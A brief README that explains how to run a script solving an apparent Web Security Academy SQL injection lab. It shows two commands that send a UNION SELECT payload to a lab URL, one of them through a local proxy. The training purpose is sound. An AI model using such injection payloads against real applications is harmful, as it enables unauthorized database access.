# How to run script.py

### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

#### Copy the string from home page (Make the database retrieve the string: 'string') and replace f1KkGv

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "' UNION SELECT NULL,'f1KkGv',NULL--"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "' UNION SELECT NULL,'f1KkGv',NULL--" -p 127.0.0.1:8080`
